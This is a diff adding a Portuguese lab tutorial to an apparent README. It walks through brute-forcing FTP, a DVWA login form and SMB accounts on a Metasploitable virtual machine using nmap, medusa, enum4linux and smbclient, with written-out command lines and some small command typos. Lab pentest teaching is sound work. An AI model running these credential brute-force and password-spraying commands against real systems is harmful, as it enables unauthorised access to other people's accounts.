@@ -137,7 +137,7 @@ Agora abra o  metasploitable com um duplo clique espere carregar tudo depois dig
 Ao acessar digite ifconfig ou ip a  para visualizar o endereço ip da maquina como circulando na imagem abaixo: 
 </p>
 <img src="images/ifconfig metasploit.PNG">
-<pr>
+<p>
 Esse circulado com a cor vermelha é o nosso ip alvo guarde bem ele e depois se quiser crie um snpashot pra salvarguardar o sistema de erros .
 </p>
 
@@ -145,7 +145,141 @@ Esse circulado com a cor vermelha é o nosso ip alvo guarde bem ele e depois se 
 <hr>
 <br>
 
-<!-- <h3 align="center"></h3>
+<h3 align="center">Atacndo um servidor FTP</h3>
+<p>Vamos primeiro verificar se um servidor FTP é antigo e com falhas na segurança no sentindo de estar exposto ou não. </p>
 
-<p></p>
-<img src="images/"> -->
+<p>Como eu já tenho meu alvo agora tenho que enumerar, ou seja, é a parte da colheita do meu alvo antes de atacá-lo</p> 
+<p>
+Primeiro para alcançar o nosso alvo vulnerável usaremos o ping –c 192.168.56.101 que é a nossa maquina alvo nesse exemplo, obviamente que isso se dar no kali linux</p> 
+<img src="images/ftp/pingando nosso alvo.png">
+<p>Como vc vê de tudo certo na nossa conexão com nosso alvo.</p>
+<p>Agora vamos verificar se ele está exposto utilizando a ferramenta nmap para ver quais portas estão abertas e fechadas</p>
+
+```bash
+nmap –sV –p 21,22,80,445 192.168.56.101 
+```
+
+<p>Esse comando escaneia as portas mais utilizadas que é 21, 22, 80, 445</p>
+<img src="images/ftp/portas abertas.png">
+<p>Quando terminar de escanear veremos as saídas das portas.</p>
+
+<p>Agora verificaremos se o serviço esta realmente ativo conectando diretamente no servidor ftp com o comando:</p> 
+
+```bash
+ftp 192.168.56.101 
+```
+<p>Caso apareça a seguinte tela apreça é porque está funcionando veja imagem com o circulo vermelho</p> 
+<img src="images/ftp/tela boas vindas do ftp.png">
+
+<p>Agora vamos invadir usando a técnica de força bruta usando a ferramenta medusa, primeiro criaremos as litas de usuários e senhas:</p> 
+
+<p> primeiro criaaremos uma mini lista de usuários</p> 
+
+```bash
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt 
+``` 
+
+<p>segundo criaremos uma mini lista de senhas</p> 
+
+```bash 
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt 
+``` 
+<img src="images/ftp/mini listas de usuarios e senhas.png">
+<p>Esses comandos criaram um aquivo de texto acessíveis vc pode abrir para conferir.</p>
+<p>Agora realizaremos nosso ataque de força bruta com a ferramenta medusa eis a linha de comando para tal:</p> 
+
+```bash 
+medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 6 
+``` 
+<p>
+Depois de executar medusa ele vai retornar com mensagem erro caso não consiga ter sucesso e se caso conseguiu ele lhe dará uma mensagem de sucesso.
+
+A saída lhe dará a combinação válida para você acessar o protocolo ftp com sucesso após testar as outras combinações passando na lista que foi criado com o comando</p>
+<img src="images/ftp/ataque for;a bruta com medusa com sucesso.png">
+<br>
+<p>Agora podemos testar manualmente e veja o que acontece usando o usuário e sanha que foi validada com sucesso.</p>
+<img src="images/ftp/conexao bem sucedida .png">
+<br>
+<hr>
+<br>
+
+<h3 align="center">DVWA</h3>
+<h4 align="center">Damn Vulnerable Web Application</h4>
+
+<p>
+AAgora varemos um taques a formulários de login com força bruta
+
+eis o nosso fomulario de exemplo digite com seu ip alvo no navegador o seguinte</p>
+
+```bash
+http://192.168.56.101/dvwa/login.php 
+```
+<img src="images/dvwa/formulario a ser atacado.png">
+ 
+<p>Agora criaremos litas de palavras (World list)</p>
+
+<p>
+O que faremos? nós iremos pegar a pagina e o corpo da requisição caso em seis tentativas ele retorne a falha então obviamente ele falhou caso contrario o ataque foi bem sucedido</p> 
+
+```bash
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \  -m PAGE: '/dvwa/login.php'\  -m FROM: 'Username=^USER^&password=^PASS^&Login=login' \  -m 'FAIL=login failed' -t 6 
+```
+<img src="images/dvwa/atacando formulario de login.png"> 
+
+<h3 align="center">Ataques smb</h3>
+
+<h3 align="center">Ataques em cadeia</h3> 
+
+<p>Descobrindo serviços smb</p> 
+<p>Primeiro vamos usar um comando que vai ativar todo tipo de enumeração possível sobre nosso alvo:</p>
+
+```bash
+enum4linux -a 192.168.56.101 | tee enum4_output.txt 
+```
+
+<p>Depois de rodar digite o seguinte comando:</p>
+
+```bash
+less enum4_output.txt 
+```
+<p>Esse comando vai abrir um arquivo com diversas informações  caso queira sair da tela aperte a tecla “q”</p>
+
+<p>Criando wordlist de usuários</p>
+
+```bash
+echo -e "user\nmsfadmin\nservice" > smb_users.txt 
+```
+<p>Esse comando vai alimentar a nossa ferramenta de ataque</p>
+
+ 
+<h3 align="center">Password Spraying</h3>
+
+
+<p>Password Spraying poucas senhas em muito usuários de forma silenciosa evitando o firewall</p> 
+
+```bash
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt 
+```
+ 
+<p>Agora vamos utilizar a ferramenta medusa</p>
+
+```bash
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
+```
+<img src="images/smb/ferramenta medusa executada no ataque smb.png">
+<p>
+Quando a aprece ACCOUNT FOUND é porque o ataque deu certo, ou seja, vc agora tem todo acesso inclusive ao painel  administrativo com esses dados.</p>
+<img src="images/smb/ferramenta medusa executada no ataque smbII.png">
+
+<p>Agora vou verificar para ver se eu tenho acesso ao administrador com o user name usado</p>
+
+```bash
+smbclient -L //192.168.56.101 -U msfadmin 
+```
+<p>Digte esse comando e aperte enter, e aparecerá uma tela pedindo a senha</p>
+<img src="images/smb/pedindo senha do administrador.png">
+
+<p>A pós digitar a senha vc terá o acesso ao administrador</p>
+<img src="images/smb/acesso total ao administrador.png">
+
+<p>Agora o ataque foi bem-sucedido podemos agora navegar e fazermos o que bem entendermos com esse acesso nesta máquina</p>
